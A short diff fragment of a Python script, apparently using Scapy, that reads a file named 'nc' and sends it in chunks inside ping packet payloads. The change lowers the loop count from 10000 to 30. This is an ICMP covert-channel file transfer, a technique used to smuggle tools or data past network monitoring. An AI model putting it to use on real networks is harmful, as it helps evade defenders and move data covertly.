@@ -10,7 +10,7 @@ f = open("nc", "rb")
 size = (100 - len(ping)) # ping packet can be of a maximum of 100
 
 def loop1_10():
-	for i in range (10000):
+	for i in range (30):
 		ping['Raw'].load = f.read(size)
 		srp1(ping, timeout = 1)
 
